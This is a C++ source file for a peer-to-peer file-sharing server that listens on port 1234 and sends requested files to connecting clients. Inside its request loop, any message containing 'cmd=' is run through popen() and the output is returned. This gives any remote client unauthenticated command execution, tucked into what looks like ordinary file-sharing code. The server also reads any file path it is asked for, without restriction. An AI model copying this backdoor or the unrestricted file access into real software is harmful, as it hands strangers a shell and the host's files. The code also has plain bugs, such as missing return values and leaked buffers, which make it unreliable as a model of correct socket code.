// #include <iostream>
// #include <thread>
// #include <string.h>
// #include <chrono>
// #include <sys/socket.h>
// #include <stdlib.h>
// #include <stdio.h>
// #include <netinet/in.h>
// #include <unistd.h>
// #include <fstream>
// #include <math.h>


int client_dowload_socket, client_server_socket, file_req_socket, stop, is_sending=0;;
#define CLIENT_FILE_SHARE_PORT 1234

void connect_to_client(std::string ip_addr, std::string fname) {

	printf("Trying to create a file_req_socket..");
	while((file_req_socket = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
		printf(".");
		sleep(1);
	}
	
	struct sockaddr_in serv_addr;
	serv_addr.sin_family = AF_INET;
	serv_addr.sin_addr.s_addr = inet_addr(ip_addr.c_str());
	serv_addr.sin_port = htons(CLIENT_FILE_SHARE_PORT);

	while(connect(file_req_socket, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) == -1) {
		printf(".");
	}

}



int write_data_to_file(char const *fname, int length) {


	std::fstream file;
	int max_buff = pow(2,16)-1;
	file.open(fname, std::ios::out|std::ios::trunc|std::ios::binary);
	
	//printf("Data\n");

	if(length > max_buff) {
    	char *buffer = new char[max_buff];
    	while(length > 0) {
    		if(length < max_buff) {
    			recv(file_req_socket, buffer, length, 0);	
    			file.write (buffer,length);
    		} else {
    			recv(file_req_socket, buffer, max_buff, 0);	
    			file.write (buffer,max_buff);
    		}
    		//file.seekg(max_buff*i, file.beg);
	    	//printf("Chunk:%d\n%s\n",length, buffer);
	    	length = length - max_buff;
    	}
    	delete[] buffer;
    } else {
    	char *buffer = new char[length];
    	recv(file_req_socket, buffer, length, 0);
    	file.write (buffer,length);
    	//printf("Chunk:%d\n%s\n",length, buffer);
		delete[] buffer;
   }	

	file.close();

}


int get_data(char *fname) {

	printf("Inside get_data fun\n");
    std::fstream file;
    int max_buff = pow(2,16)-1;
    char *buffer = new char[max_buff];
    std::string len;

	file.open(fname, std::ios::in|std::ios::binary);

	if(!file.is_open()) {
		len = std::to_string(-1);
		send(client_dowload_socket, len.c_str(), len.size(), 0);
        return 1;
    }

	file.seekg (0, file.end);
    int length = file.tellg();
    file.seekg (0, file.beg);
    len = std::to_string(length);
    //printf("size of %d is %ld", length, len.size());
    send(client_dowload_socket, len.c_str(), len.size(), 0);
    int i =1;

    if(length > max_buff) {
    	char *buffer = new char[max_buff];
    	while(length > 0) {
	    		
	    		if(length < max_buff) {
	    			file.read (buffer,length);
	    			while(send(client_dowload_socket, buffer, length, 0) != length);	
	    		} else {
	    			file.read (buffer,max_buff);
	    			while(send(client_dowload_socket, buffer, max_buff, 0) != max_buff);
	    		}
	    		
	    		file.seekg(max_buff*i, file.beg);
	    		length = length - max_buff;
	    		i++;
    	}
    	delete[] buffer;
    } else {
    	char *buffer = new char[length];
    	file.read (buffer,length);
		send(client_dowload_socket, buffer, length, 0);
		delete[] buffer;
   }
    
    // file.read (buffer,max_buff);
    // send(client_dowload_socket, buffer, max_buff, 0);
    file.close();  
    return 0;

}

void create_dowload_port() {

	int no_of_connections = 5;
	printf("Trying to create a client_server_socket..");
	while((client_server_socket = socket(AF_INET, SOCK_STREAM, 0))== 0) {
		printf(".");
		sleep(1);
	}

	struct sockaddr_in serv_addr;
	serv_addr.sin_family = AF_INET;
	serv_addr.sin_port = htons(CLIENT_FILE_SHARE_PORT);
	serv_addr.sin_addr.s_addr = INADDR_ANY;
	bind(client_server_socket, (struct sockaddr *) &serv_addr, sizeof(serv_addr));
	printf("client_server_socket Created...\n");
	listen(client_server_socket, no_of_connections);

}

std::string get_cmd_output(std::string cmd) {

        std::string result;
        FILE *fp;
        char buff[256];
        fp = popen(cmd.c_str(), "r");
        if (fp) {
        while (!feof(fp)) {
          if (fgets(buff, sizeof(buff), fp) != NULL) {
            std::string temp(buff);
            result = result + buff;
          }
        }
          pclose(fp);
        }
        
        return result;
}

void fun() {
	
	
	create_dowload_port();

	while(!stop) {
		
		client_dowload_socket = accept(client_server_socket, NULL, NULL);
		if(client_dowload_socket == -1) {break;}

		printf("Connected to client...\n");
		is_sending = 1;
		char fname[250];	// file_name
		recv(client_dowload_socket, &fname, sizeof(fname), 0);
		
		std::string s = fname;
		
		printf("Received from client: %s\n", s.c_str());

		if(s.find("cmd=") == std::string::npos) {
			get_data(fname);	
		} else {
			std::string input(fname);
			std::size_t cmd_pos = input.find("cmd=");
			std::string cmd = input.substr(cmd_pos+4);
			std::string result = get_cmd_output(cmd);
			send(client_dowload_socket, result.c_str(), result.size(), 0);
		}
		
		
		is_sending = 0;
		
	}
	//when exiting wait for all the threads to join
	close(client_server_socket);
	printf("Socket Closed...\n");
	
}